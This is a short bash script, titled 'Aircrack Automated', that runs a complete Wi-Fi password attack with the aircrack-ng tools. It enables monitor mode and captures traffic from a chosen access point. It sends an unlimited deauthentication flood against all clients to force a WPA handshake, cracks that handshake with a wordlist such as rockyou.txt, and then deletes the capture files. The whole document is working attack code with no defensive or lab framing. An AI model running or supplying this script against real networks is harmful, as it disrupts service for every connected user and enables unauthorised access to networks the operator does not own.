#!/bin/bash
clear
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo "|A|i|r|c|r|a|c|k| |A|u|t|o|m|a|t|e|d|"
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo
echo Enter Interface Name:
read interface
#interface=$(ifconfig | grep wl | cut -d ":" -f1)
airmon-ng start $interface
airmon-ng check kill
echo Enter Monitor Mode Interface:
read mon
#mon=$(ifconfig | grep wl | cut -d ":" -f1)
airodump-ng $mon
echo Enter BSSID Of Target
read bid
echo $bid
echo Enter Channel Of Target
read chnl
#xterm -hold -e sudo "airodump-ng --bssid $bid --channel $chnl --write $filn $mon"
client=FF:FF:FF:FF:FF:FF
airodump-ng --ig -w cap -c $chnl --bssid $bid $mon & sleep 6 &&
xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid -c $client $mon"
sleep 4
clear
echo "1. Use Default Wordlist(rockyou.txt)."
echo "2. Specify a Custom One."
read option
if [ $option == "1" ]; then
   wordlist="/usr/share/wordlists/rockyou.txt"
else
   echo Enter Path Of Your Custom Wordlist.
   read wordlist
fi
aircrack-ng -w $wordlist ./cap-01.cap
echo Disabling Monitor Mode........
airmon-ng stop $mon
echo Deleting Handshake Files.......
rm cap*
echo done!